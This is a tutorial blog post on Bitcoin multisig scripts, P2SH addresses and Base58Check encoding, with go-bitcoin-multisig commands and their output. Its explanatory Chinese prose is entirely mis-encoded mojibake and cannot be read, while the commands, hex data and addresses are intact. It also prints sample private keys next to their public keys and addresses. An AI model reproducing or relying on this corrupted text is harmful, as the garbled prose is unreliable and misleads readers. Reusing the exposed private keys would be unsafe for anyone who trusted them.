<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">n-&gt;    3</span><br><span class="line">       (pubKey3)</span><br><span class="line">       (pubKey2)</span><br><span class="line">ikey-&gt; (pubKey1)</span><br><span class="line">m-&gt;    2</span><br><span class="line">       (sig2)</span><br><span class="line">isig-&gt; (sig1)</span><br><span class="line">       0</span><br></pre></td></tr></table></figure>

<p>åŸºæœ¬ç®—æ³•å¦‚ä¸‹ï¼š</p>
<ol>
<li>é¦–å…ˆå¼¹å‡ºn,næ˜¯å…¬é’¥çš„ä¸ªæ•°</li>
<li>å‡ºæ ˆnä¸ªå…¬é’¥</li>
<li>å‡ºæ ˆ m, mæ˜¯æ‰€éœ€çš„ç­¾åçš„ä¸ªæ•°</li>
<li>å‡ºæ ˆ mä¸ªç­¾å</li>
<li>å°†OP_0å‡ºæ ˆï¼ˆå†å²é—ç•™é—®é¢˜ï¼‰</li>
<li>å¯¹å…¬é’¥å¯ä»¥å¾ªç¯ï¼Œä»æœ€ä¸Šé¢çš„å¼€å§‹ï¼Œå¯¹æ¯ä¸€ä¸ªå…¬é’¥ï¼Œæ£€æŸ¥ä¸€ä¸ªç­¾åã€‚éƒ½ä»æœ€ä¸Šçš„å¼€å§‹ï¼Œå¦‚æœå¤±è´¥ï¼Œåˆ™ä½¿ç”¨ä¸‹ä¸€ä¸ªå…¬é’¥æ¥æ£€æŸ¥åŒä¸€ä¸ªç­¾åï¼›å¦‚æœæˆåŠŸï¼Œåˆ™ä½¿ç”¨ä¸‹ä¸€ä¸ªå…¬é’¥æ¥æ£€æŸ¥ä¸‹ä¸€ä¸ªç­¾åï¼ˆç­¾åå¿…é¡»å’Œå…¬é’¥çš„é¡ºåºç›¸åŒï¼‰ã€‚</li>
<li>å¦‚æœç­¾åæˆåŠŸï¼Œåˆ™CHECKMULTISIGè¿”å›1ï¼Œå¦åˆ™è¿”å›0ã€‚</li>
</ol>
<p>ä»¥ä¸Šéƒ¨åˆ†æ˜¯å¯¹MULTISIGçš„ä»‹ç»ï¼Œä¸‹é¢å°†ä»‹ç»P2SHï¼Œé¡ºä¾¿ç”¨ä¸€ä¸‹MULTISIGã€‚</p>
<h2 id="P2SHï¼ˆpay-to-script-hash"><a href="#P2SHï¼ˆpay-to-script-hash" class="headerlink" title="P2SHï¼ˆpay-to-script-hash)"></a>P2SHï¼ˆpay-to-script-hash)</h2><p>ä¹‹å‰æˆ‘ä»¬ä»‹ç»äº†ä¸¤ç§äº¤æ˜“ç±»å‹P2PKHå’ŒP2PKï¼Œç°åœ¨æ¥è®¨è®ºä¸€ç§æ–°çš„äº¤æ˜“ç±»å‹ï¼Œpay-to-script-hashã€‚é¡¾åæ€ä¹‰ï¼Œpay-to-script-hashå°±æ˜¯æŠŠå¸å‘åˆ°ä¸€ä¸ªè„šæœ¬çš„å“ˆå¸Œï¼Œè€Œä¸æ˜¯å…¬é’¥æˆ–è€…å…¬é’¥å“ˆå¸Œã€‚</p>
<p>å…¸å‹çš„æ¯”ç‰¹å¸åœ°å€é•¿å¾—åƒ<em>15Cytz9sHqeqtKCw2vnpEyNQ8teKtrTPjp</em>ï¼Œä¹Ÿæ˜¯Pay-to-PubKeyHash (P2PKH) çš„è¾“å‡ºè„šæœ¬ä¸­æ‰€ç”¨çš„åœ°å€ã€‚Pay-to-ScriptHash (P2SH) é•¿çš„å’Œç”¨çš„éƒ½ä¸ä¸€æ ·ã€‚å…¸å‹çš„P2SHåœ°å€åƒ<em>347N1Thc213QqfYCz3PZkjoJpNv5b14kBd</em>ï¼Œå¦å¤–ï¼ŒP2SH æ€»æ˜¯ä»¥3å¼€å¤´çš„ï¼Œè€ŒP2PKHåœ°å€æ€»æ˜¯ä»¥1å¼€å¤´ã€‚è¿™æ˜¯å› ä¸ºP2SHåœ°å€çš„ç‰ˆæœ¬å‰ç¼€æ˜¯<em>0x05ï¼Œ</em> è€ŒP2PKHçš„åœ°å€å‰ç¼€æ˜¯<em>0x00</em>, åœ¨<a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/Base58Check_encoding">base58check</a>ç¼–ç ä¸­åˆ†åˆ«ç”Ÿæˆ3å’Œ1ã€‚</p>
<p>å’ŒMULTICHECKSIGä¸€æ ·ï¼ŒP2SHä¹Ÿä¸æ˜¯æ¯”ç‰¹å¸è¯ç”Ÿä¹‹åˆå°±æœ‰çš„ï¼Œå®ƒæ˜¯2012å¹´çš„BIP 16ä¸­æå‡ºçš„ã€‚æå‡ºP2SHçš„ç›®çš„ä¸»è¦æ˜¯å› ä¸ºåœ¨ä¹‹å‰çš„äº¤æ˜“ä¸­ï¼Œéƒ½æ˜¯ç”±å‘é€è€…è´Ÿè´£æŒ‡å®šèµå‡ºå¸çš„æ¡ä»¶ã€‚è¿™æ ·çš„è¯ï¼Œå¦‚æœèµå‡ºå¸çš„è¿‡ç¨‹æ¯”è¾ƒå¤æ‚ï¼Œè­¬å¦‚è¦ä½¿ç”¨MULTISIGï¼Œé‚£ä¹ˆå¯¹ä»˜é’±çš„ç”¨æˆ·ï¼Œä¹Ÿå°±æ˜¯ä¹°å®¶ï¼Œå°±ä¸å¤Ÿå‹å¥½ã€‚ä½¿ç”¨P2SHçš„æ–¹å¼ï¼Œå¯ä»¥ç”±å¸çš„æ¥æ”¶æ–¹è®¾è®¡å¥½æ‰§è¡Œçš„è„šæœ¬ï¼Œç„¶åä¸è®ºè„šæœ¬å¤šä¹ˆå¤æ‚ï¼Œå‘é€æ–¹åªéœ€è¦å°†å¸å‘é€åˆ°ä¸€ä¸ª20å­—èŠ‚çš„å“ˆå¸Œåœ°å€å°±è¡Œã€‚</p>
<p>è­¬å¦‚Aliceå‘Bobè´­ä¹°ä¸€ä»¶ç‰©å“ï¼Œä½†æ˜¯Bobçš„ç‰©å“ä¸æ˜¯è‡ªå·±ç‹¬æœ‰çš„ï¼Œä»–éœ€è¦å’Œå…¶ä»–äººä¸€èµ·åˆ†äº«Aliceä»˜çš„å¸ï¼Œå°±ä¾‹å¦‚ä¸Šé¢ä»‹ç»çš„MULTICHECKï¼Œéœ€è¦3ä¸ªäººä¸­çš„ä¸¤äººåŒæ„æ‰èƒ½ä½¿ç”¨å¸ã€‚æŠŠè¿™ä¸ªä»»åŠ¡äº¤ç»™Aliceæ˜¯ä¸åˆç†çš„ï¼Œå› ä¸ºAliceåªå…³å¿ƒè‡ªå·±ä»˜äº†é’±èƒ½å¤Ÿæ‹¿åˆ°ç‰©å“ï¼Œå¹¶ä¸å…³å¿ƒBobæ‹¿åˆ°é’±ä¹‹åæ€ä¹ˆåˆ†ã€‚è¿™ä¸ªæ—¶å€™Bobå¯ä»¥åˆ›å»ºä¸€ä¸ªScriptï¼Œç„¶åAliceå¯ä»¥å°†å¸å‘é€åˆ°è¿™ä¸ªScriptåœ°å€ã€‚</p>
<p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹P2SHçš„è§„èŒƒï¼š</p>
<p>åœ¨æ”¯ä»˜ç”¨æˆ·çš„äº¤æ˜“Tx1ä¸­çš„è¾“å‡ºè„šæœ¬æ˜¯ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">OP_HASH160 [20-byte-hash-value] OP_EQUAL</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­ï¼Œ[20-byte-hash-value]æ˜¯push-20-bytes-onto-the-stack opcode (0x14) ä¹‹åè·Ÿç€20ä¸ªå­—èŠ‚ã€‚è€ƒè™‘åˆ°éªŒè¯æ—¶æ˜¯å°†Bobçš„ç­¾åè„šæœ¬+Aliceçš„è¾“å‡ºè„šæœ¬ï¼Œæ‰€ä»¥åŸºæœ¬ä¸Šå¯ä»¥çŒœå‡ºï¼Œåœ¨OP_HASH160ä¹‹å‰ï¼Œæ ˆé‡Œåº”è¯¥æ˜¯Bobæä¾›ç»™Aliceçš„è„šæœ¬çš„åŸæ–‡ï¼Œç„¶åAliceçš„è¾“å‡ºè„šæœ¬ä¸­çš„SHä¹Ÿå…¥æ ˆï¼Œæœ€åæ˜¯è¿è¡ŒOP_EQUALï¼Œåˆ¤æ–­æ˜¯å¦ç›¸ç­‰ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233020.jpg" alt="img"></p>
<p>ç„¶åæ¥æ”¶æ–¹Bobè¦æå–å¸çš„æ—¶å€™ï¼ŒscriptSigçš„å½¢å¼åº”è¯¥æ˜¯:</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">...signatures... &#123;serialized script&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233022.jpg" alt="img"></p>
<p>scriptSigé¦–å…ˆéœ€è¦æ»¡è¶³Aliceçš„scriptPubKeyçš„è¦æ±‚ï¼Œä¹Ÿå³éœ€è¦æä¾›ä¸€ä¸ªscriptåŸæ–‡ï¼Œä½¿å¾—ç»è¿‡å“ˆå¸Œä¹‹åçš„å€¼ç­‰äºAliceçš„scriptPubKeyä¸­æŒ‡å®šçš„å“ˆå¸Œå€¼ï¼›å¦ä¸€æ–¹é¢ï¼Œä½œä¸ºP2SHç±»å‹çš„äº¤æ˜“ï¼ŒBobè¿˜å¿…é¡»æä¾›æ»¡è¶³è„šæœ¬æœ¬èº«çš„æ¡ä»¶çš„signaturesã€‚ç›¸å½“äºæ¯”Aliceç›´æ¥å†™è„šæœ¬å¤šäº†ä¸€æ­¥ã€‚</p>
<p>åšä¸€ä¸ªå…·ä½“çš„ä¾‹å­ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒP2SHçš„è„šæœ¬æ˜¯ä¸€ä¸ª2-of-3çš„å¤šç­¾åã€‚</p>
<p>é¦–å…ˆBobéœ€è¦åˆ›å»º2-of-3 multisig P2SHåœ°å€ã€‚</p>
<p>ä¸ºäº†åˆ›å»ºè¿™ä¸ªåœ°å€ï¼Œé¦–å…ˆBobéœ€è¦ç”Ÿæˆ3ä¸ªåå…­è¿›åˆ¶çš„å…¬é’¥åœ°å€ã€‚è¿™é‡Œä½¿ç”¨go-bitcoin-multisigç”Ÿæˆ3å¯¹å…¬ç§é’¥å¯¹ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">go-bitcoin-multisig keys --count 3 --concise</span><br></pre></td></tr></table></figure>

<p>ç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">--------------</span><br><span class="line">KEY #1  </span><br><span class="line">Private key:  </span><br><span class="line">5JruagvxNLXTnkksyLMfgFgf3CagJ3Ekxu5oGxpTm5mPfTAPez3  </span><br><span class="line">Public key hex:  </span><br><span class="line">04a882d414e478039cd5b52a92ffb13dd5e6bd4515497439dffd691a0f12af9575fa349b5694ed3155b136f09e63975a1700c9f4d4df849323dac06cf3bd6458cd  </span><br><span class="line">Public Bitcoin address:  </span><br><span class="line">1JzVFZSN1kxGLTHG41EVvY5gHxLAX7q1Rh  </span><br><span class="line">--------------</span><br><span class="line">--------------</span><br><span class="line">KEY #2  </span><br><span class="line">Private key:  </span><br><span class="line">5JX3qAwDEEaapvLXRfbXRMSiyRgRSW9WjgxeyJQWwBugbudCwsk  </span><br><span class="line">Public key hex:  </span><br><span class="line">046ce31db9bdd543e72fe3039a1f1c047dab87037c36a669ff90e28da1848f640de68c2fe913d363a51154a0c62d7adea1b822d05035077418267b1a1379790187  </span><br><span class="line">Public Bitcoin address:  </span><br><span class="line">14JfSvgEq8A8S7qcvxeaSCxhn1u1L71vo4  </span><br><span class="line">--------------</span><br><span class="line">--------------</span><br><span class="line">KEY #3  </span><br><span class="line">Private key:  </span><br><span class="line">5JjHVMwJdjPEPQhq34WMUhzLcEd4SD7HgZktEh8WHstWcCLRceV  </span><br><span class="line">Public key hex:  </span><br><span class="line">0411ffd36c70776538d079fbae117dc38effafb33304af83ce4894589747aee1ef992f63280567f52f5ba870678b4ab4ff6c8ea600bd217870a8b4f1f09f3a8e83  </span><br><span class="line">Public Bitcoin address:  </span><br><span class="line">1Kyy7pxzSKG75L9HhahRZgYoer9FePZL4R  </span><br><span class="line">--------------</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·æˆ‘ä»¬å°±æœ‰äº†ä¸‰ä¸ªåå…­è¿›åˆ¶çš„å…¬é’¥ï¼š</p>
<p>Key A:<br>04a882d414e478039cd5b52a92ffb13dd5e6bd4515497439dffd691a0f12af9575fa349b5694ed3155b136f09e63975a1700c9f4d4df849323dac06cf3bd6458cd </p>
<p>Key B:<br>046ce31db9bdd543e72fe3039a1f1c047dab87037c36a669ff90e28da1848f640de68c2fe913d363a51154a0c62d7adea1b822d05035077418267b1a1379790187 </p>
<p>Key C:<br>0411ffd36c70776538d079fbae117dc38effafb33304af83ce4894589747aee1ef992f63280567f52f5ba870678b4ab4ff6c8ea600bd217870a8b4f1f09f3a8e83 </p>
<p>ç„¶åï¼Œæˆ‘ä»¬æŒ‡æ˜æˆ‘ä»¬éœ€è¦ä¸€ä¸ª2-of-3çš„åœ°å€ï¼Œå¹¶ä¸”å°†æˆ‘ä»¬çš„3ä¸ªå…¬é’¥ä½œä¸ºè¾“å…¥ï¼Œä»¥ç”Ÿæˆè¯¥P2SHåœ°å€ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">go-bitcoin-multisig address --m 2 --n 3 --public-keys 04a882d414e478039cd5b52a92ffb13dd5e6bd4515497439dffd691a0f12af9575fa349b5694ed3155b136f09e63975a1700c9f4d4df849323dac06cf3bd6458cd,046ce31db9bdd543e72fe3039a1f1c047dab87037c36a669ff90e28da1848f640de68c2fe913d363a51154a0c62d7adea1b822d05035077418267b1a1379790187,0411ffd36c70776538d079fbae117dc38effafb33304af83ce4894589747aee1ef992f63280567f52f5ba870678b4ab4ff6c8ea600bd217870a8b4f1f09f3a8e83</span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸Šå‘½ä»¤çš„è¾“å‡ºæ˜¯ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">---------------------</span><br><span class="line">Your *P2SH ADDRESS* is:  </span><br><span class="line">347N1Thc213QqfYCz3PZkjoJpNv5b14kBd  </span><br><span class="line">Give this to sender funding multisig address with Bitcoin.  </span><br><span class="line">---------------------</span><br><span class="line">---------------------</span><br><span class="line">Your *REDEEM SCRIPT* is:  </span><br><span class="line">524104a882d414e478039cd5b52a92ffb13dd5e6bd4515497439dffd691a0f12af9575fa349b5694ed3155b136f09e63975a1700c9f4d4df849323dac06cf3bd6458cd41046ce31db9bdd543e72fe3039a1f1c047dab87037c36a669ff90e28da1848f640de68c2fe913d363a51154a0c62d7adea1b822d05035077418267b1a1379790187410411ffd36c70776538d079fbae117dc38effafb33304af83ce4894589747aee1ef992f63280567f52f5ba870678b4ab4ff6c8ea600bd217870a8b4f1f09f3a8e8353ae  </span><br><span class="line">Keep private and provide this to redeem multisig balance later.  </span><br><span class="line">---------------------</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆçš„P2SHåœ°å€æä¾›ç»™Aliceã€‚</p>
<p>åŒæ—¶ç”Ÿæˆäº†Redeem Scriptï¼Œä¹Ÿå³Bobåœ¨å°†Aliceæ”¯ä»˜çš„é’±èµå‡ºçš„æ—¶å€™æä¾›çš„ç­¾åè„šæœ¬ã€‚æˆ‘ä»¬æ¥ç»†è‡´åœ°çœ‹ä¸€ä¸‹è¿™ä¸ªredeem scriptçš„ç»„æˆã€‚æ ¹æ®Bitocoinåè®®çš„multisignature redeem script, ä¹Ÿç»“åˆä¸Šé¢å¯¹multisigçš„è§£é‡Šï¼Œä¸€ä¸ªæ­£ç¡®çš„Multisigçš„èµå‡ºè„šæœ¬åº”è¯¥æ˜¯è¿™æ ·çš„ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;OP_2&gt; &lt;A pubkey&gt; &lt;B pubkey&gt; &lt;C pubkey&gt; &lt;OP_3&gt; &lt;OP_CHECKMULTISIG&gt;</span><br></pre></td></tr></table></figure>

<p>ï¼ˆOP_2<del>OP_16ï¼ŒæŒ‡ä»¤ä»£ç 0x52</del>0x60å°±æ˜¯å°†2~16å…¥æ ˆï¼‰</p>
<p>ä»¥ä¸Šredeemçš„è¾“å‡ºè„šæœ¬çš„å†…å®¹åˆ†è§£ä¸€ä¸‹å¦‚ä¸‹ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233023.jpg" alt="img"></p>
<p>ä½¿ç”¨è¿™ä¸ªredeemScriptï¼Œåˆç»è¿‡ä¸¤ä¸ªæ­¥éª¤ç”Ÿæˆäº†P2SHåœ°å€:</p>
<ol>
<li>å¯¹redeemScriptè¿›è¡Œä¸¤æ¬¡å“ˆå¸Œï¼š</li>
</ol>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">redeemScriptHash = RIPEMD160(SHA256(redeemScript))</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>Base58checkä½¿ç”¨å‰ç¼€0x05å¯¹redeemscriptHashè¿›è¡Œç¼–ç ï¼š</li>
</ol>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">P2SHAddress := base58check.Encode(&quot;05&quot;, redeemScriptHash)</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±å¾—åˆ°äº†go-bitcoin-multisigç»™å‡ºçš„P2SH åœ°å€<em>347N1Thc213QqfYCz3PZkjoJpNv5b14kBdã€‚</em> è¿™æ—¶å€™å¯ä»¥å°†è¿™ä¸ªåœ°å€å‘é€ç»™Aliceï¼ŒAliceå¯ä»¥ç”¨è¿™ä¸ªåœ°å€ç”Ÿæˆæ”¯ä»˜äº¤æ˜“ã€‚</p>
<h2 id="ä½¿ç”¨P2SHåœ°å€ç”Ÿæˆäº¤æ˜“"><a href="#ä½¿ç”¨P2SHåœ°å€ç”Ÿæˆäº¤æ˜“" class="headerlink" title="ä½¿ç”¨P2SHåœ°å€ç”Ÿæˆäº¤æ˜“"></a>ä½¿ç”¨P2SHåœ°å€ç”Ÿæˆäº¤æ˜“</h2><p>ä¸ºäº†å½¢æˆäº¤æ˜“ï¼ŒAliceéœ€è¦ä»¥ä¸‹çš„ä¿¡æ¯ï¼šæ¥è‡ªæ ‡å‡† P2PKHçš„è¾“å‡ºï¼Œè¯¥ P2PKHçš„äº¤æ˜“idï¼ˆtxidï¼‰ï¼Œç›¸å¯¹åº”çš„ç§é’¥ï¼Œéœ€è¦å‘é€çš„å¸çš„ä¸ªæ•°ï¼Œä»¥åŠç›®æ ‡P2SHåœ°å€ï¼ˆä¹Ÿå°±æ˜¯ä¸Šé¢åˆšç”Ÿæˆçš„åœ°å€ï¼‰ã€‚</p>
<p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">go-bitcoin-multisig fund --input-tx 3ad337270ac0ba14fbce812291b7d95338c878709ea8123a4d88c3c29efbc6ac --private-key 5JJyqG4bb15zqi7fTA4b227aUxQhBo1Ux6qX69ngeXYLr7fk2hs --destination 347N1Thc213QqfYCz3PZkjoJpNv5b14kBd --amount 65600</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºæ˜¯ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">-----------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">Your raw funding transaction is:  </span><br><span class="line">0100000001acc6fb9ec2c3884d3a12a89e7078c83853d9b7912281cefb14bac00a2737d33a000000008a47304402204e63d034c6074f17e9c5f8766bc7b5468a0dce5b69578bd08554e8f21434c58e0220763c6966f47c39068c8dcd3f3dbd8e2a4ea13ac9e9c899ca1fbc00e2558cbb8b01410431393af9984375830971ab5d3094c6a7d02db3568b2b06212a7090094549701bbb9e84d9477451acc42638963635899ce91bacb451a1bb6da73ddfbcf596bddfffffffff01400001000000000017a9141a8b0026343166625c7475f01e48b5ede8c0252e8700000000  </span><br><span class="line">Broadcast this transaction to fund your P2SH address.  </span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœå¤šæ¬¡è¿è¡Œè¿™ä¸ªå‘½ä»¤ï¼Œæ¯æ¬¡ç»“æœä¼šæœ‰äº›ä¸åŒï¼Œå› ä¸ºåœ¨ç”Ÿæˆæ•°å­—ç­¾åçš„æ—¶å€™nonceå€¼æ¯æ¬¡ä¼šä¸åŒï¼Œå…¶ä»–å€¼åº”è¯¥éƒ½æ˜¯ä¸€æ ·çš„ã€‚</p>
<p>åŒæ ·åœ°ï¼Œæ¥åˆ†è§£ä¸€ä¸‹è¿™ä¸ªç»“æœï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233024.jpg" alt="img"></p>
<p>å’Œå…¸å‹P2PKH äº¤æ˜“çš„ä¸»è¦ä¸åŒä¹‹å¤„åœ¨äºscriptPubKeyï¼Œè¿™é‡ŒscriptPubKeyçš„å½¢å¼æ˜¯ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;OP_HASH160&gt; &lt;redeemScriptHash&gt; &lt;OP_EQUAL&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œ<em>OP_HASH160</em> å°±æ˜¯RIPEMD160(SHA256()) å‡½æ•°ã€‚</p>
<p>è¿™æ˜¯ä¾¿å¯ä»¥å°†ä»¥ä¸Šäº¤æ˜“å‘ç½‘ç»œå¹¿æ’­ï¼Œä»¥è·å¾—è®¤è¯ã€‚ä»¥ä¸Šäº¤æ˜“çš„ <a href="https://link.zhihu.com/?target=https://blockchain.info/tx/02b082113e35d5386285094c2829e7e2963fa0b5369fb7f4b79c4c90877dcd3d">txid ä¸º02b082113e35d5386285094c2829e7e2963fa0b5369fb7f4b79c4c90877dcd3d</a>ã€‚</p>
<p>ã€<strong>redeemScriptHash å’ŒP2SHaddressçš„åŒºåˆ«</strong>ã€‘</p>
<p>â€”â€”â€”â€”â€”â€”â€”â€“è¿™é‡Œæ˜¯æ™®åŠBase58çš„åˆ†å‰²çº¿â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-</p>
<p>ä¹‹å‰ç†è§£æœ‰è¯¯ï¼Œä»¥ä¸ºP2SHaddresså°±åº”è¯¥æ˜¯åœ¨scriptPubkeyä¸­çš„åœ°å€ã€‚å› ä¸ºåœ¨æ‰§è¡Œç”ŸæˆTx1çš„å‘½ä»¤çš„æ—¶å€™ï¼Œç¡®å®ä¼ å…¥çš„å‚æ•°æ˜¯â€“destination 347N1Thc213QqfYCz3PZkjoJpNv5b14kBdã€‚æ²¡æƒ³åˆ°æœ€ç»ˆåœ¨Tx1ä¸­å‡ºç°çš„å±…ç„¶æ˜¯1a8b0026343166625c7475f01e48b5ede8c0252eã€‚ç»è¿‡åˆ†æï¼Œå¯ä»¥çŒœæƒ³å¾—å‡ºæ¥ï¼Œè¿™ä¸¤ä¸ªåœ°å€è‚¯å®šæ˜¯å­˜åœ¨å…³ç³»çš„â€”â€”ç‰¹åˆ«æ˜¯ç»¼åˆè€ƒè™‘åˆ°outputä¸­çš„scriptPubkeyï¼Œæ˜¯åœ¨<OP_HASH160> <redeemScriptHash>ä¹Ÿå³ï¼Œå¯ä»¥åˆ†æå¾—å‡º1a8b0026343166625c7475f01e48b5ede8c0252eæ˜¯åŸå§‹è„šæœ¬ç»è¿‡hash160 çš„ç»“æœï¼Œè€Œ347N1Thc213QqfYCz3PZkjoJpNv5b14kBdåˆ™æ˜¯1a8bâ€¦â€¦..ç»è¿‡base58checkç¼–ç ä¹‹åçš„ç»“æœã€‚</p>
<p>é‚£ç°åœ¨çš„é—®é¢˜å…¶å®ä¸»è¦åœ¨äºï¼Œä¸ºä»€åœ¨å‘½ä»¤ä¸­ç»™å‡ºäº†â€“destinationæ˜¯347Nâ€¦.4kBdçš„æƒ…å†µä¸‹ï¼Œèƒ½å¤Ÿé¡ºåˆ©åœ°å¾—å‡º1a8bâ€¦.252eã€‚</p>
<p>çº ç»“è¿™ä¸ªé—®é¢˜å…¶å®ä¸»è¦æ˜¯å› ä¸ºå¯¹Base58çš„ç†è§£ä¸å¤Ÿã€‚ç‰¹åˆ«æ˜¯å“ˆå¸Œç”¨å¤šäº†ï¼Œå•å‘å‡½æ•°ä¸èƒ½é€†æ¨çš„æƒ³æ³•æœ‰ç‚¹æ·±å…¥äººå¿ƒäº†ã€‚</p>
<p>ä¸ºä»€ä¹ˆä¼šä½¿ç”¨Base58å‘¢ï¼Ÿ</p>
<p>ä¸»è¦æ˜¯ä¸ºäº†æ›´ç®€æ´æ–¹ä¾¿åœ°è¡¨ç¤ºé•¿ä¸²çš„æ•°å­—ã€‚è­¬å¦‚ï¼Œåè¿›åˆ¶è®¡æ•°ç³»ç»Ÿä½¿ç”¨0-9åä¸ªæ•°å­—ï¼Œè€Œåå…­è¿›åˆ¶ç³»ç»Ÿä½¿ç”¨äº†é¢å¤–çš„ A-F å…­ä¸ªå­—æ¯ã€‚åŒæ ·çš„æ•°å­—ï¼Œå®ƒçš„åå…­è¿›åˆ¶è¡¨ ç¤ºå°±ä¼šæ¯”åè¿›åˆ¶è¡¨ç¤ºæ›´çŸ­ã€‚æ›´è¿›ä¸€æ­¥ï¼ŒBase64ä½¿ç”¨äº†26ä¸ªå°å†™å­—æ¯ã€26ä¸ªå¤§å†™å­—æ¯ã€10ä¸ªæ•°å­—ä»¥åŠä¸¤ä¸ªç¬¦å·ï¼ˆä¾‹ å¦‚â€œ+â€å’Œâ€œ&#x2F;â€ï¼‰ã€‚Base58æ˜¯Base64ç¼–ç æ ¼å¼çš„å­é›†ï¼ŒåŒæ ·ä½¿ç”¨å¤§å°å†™å­—æ¯å’Œ10ä¸ªæ•°å­—ï¼Œä½†èˆå¼ƒäº†ä¸€äº›å®¹æ˜“é”™ è¯»å’Œåœ¨ç‰¹å®šå­—ä½“ä¸­å®¹æ˜“æ··æ·†çš„å­—ç¬¦ã€‚å…·ä½“åœ°ï¼ŒBase58ä¸å«Base64ä¸­çš„0ï¼ˆæ•°å­—0ï¼‰ã€Oï¼ˆå¤§å†™å­—æ¯oï¼‰ã€lï¼ˆå°å†™å­—æ¯ Lï¼‰ã€Iï¼ˆå¤§å†™å­—æ¯iï¼‰ï¼Œä»¥åŠâ€œ+â€å’Œâ€œ&#x2F;â€ä¸¤ä¸ªå­—ç¬¦ã€‚ç®€è€Œè¨€ä¹‹ï¼ŒBase58å°±æ˜¯ç”±ä¸åŒ…æ‹¬ï¼ˆ0ï¼ŒOï¼Œlï¼ŒIï¼‰çš„å¤§å°å†™å­—æ¯å’Œæ•°å­—ç»„æˆã€‚ä¹‹æ‰€ä»¥åšå‡ºè¿™æ ·çš„é€‰æ‹©ï¼Œå°±æ˜¯å¯¹äººå‹å¥½ï¼Œè®©äººåœ¨çœ‹åˆ°Base58ç¼–ç çš„æ•°æ®ä¹‹åä¸ä¼šç–‘æƒ‘ï¼Œä»è€Œé˜²æ­¢å‡ºé”™ã€‚è¿™æ˜¯å› ä¸ºï¼Œå¦‚æœåœ¨æ¯”ç‰¹å¸äº¤æ˜“ä¸­å¦‚æœå› ä¸ºçœ‹ä¸æ¸…æ¥šåœ°å€è€Œè¾“é”™äº†ç›®æ ‡åœ°å€ï¼Œé‚£ä¹ˆä»˜å‡ºå»çš„é’±æ˜¯æ‹¿ä¸å›æ¥çš„ï¼Œæ‰€ä»¥ä¸€å®šè¦é˜²æ­¢è¿™ç§é”™è¯¯ã€‚</p>
<p>Base58æ˜¯æ€ä¹ˆå·¥ä½œçš„å‘¢ï¼Ÿ</p>
<p>Base58 ç”¨åœ¨æ¯”ç‰¹å¸å’Œå…¶å®ƒçš„åŠ å¯†è´§å¸ä¸­ï¼Œä¸ä»…å®ç°äº†æ•°æ®å‹ç¼©ï¼Œä¿æŒäº†æ˜“è¯»æ€§ï¼Œè¿˜å…·æœ‰é”™è¯¯è¯Šæ–­åŠŸèƒ½ã€‚å…·ä½“å·¥ä½œæ–¹å¼å¦‚ä¸‹å›¾ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233025.jpg" alt="img"></p>
<p>åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œpayloadå°±æ˜¯1a8bâ€¦â€¦.252eï¼Œå…±20ä¸ªå­—èŠ‚ï¼ˆ160ä½ï¼‰ï¼›ç„¶åå¢åŠ å‰ç¼€ï¼Œè¿™é‡Œæ˜¯0x05ï¼›æ–°ç”Ÿæˆçš„å­—ç¬¦ä¸²è¿›è¡Œè¿ç»­ä¸¤æ¬¡çš„SHA256å“ˆå¸Œï¼Œå–ç»“æœçš„å‰å››ä¸ªå­—èŠ‚ä½œä¸ºæ ¡éªŒå’Œå½¢æˆåç¼€ï¼›è¿™äº›è¿›è¡Œbase58ç¼–ç çš„å°±æ˜¯25ä¸ªå­—èŠ‚ã€‚</p>
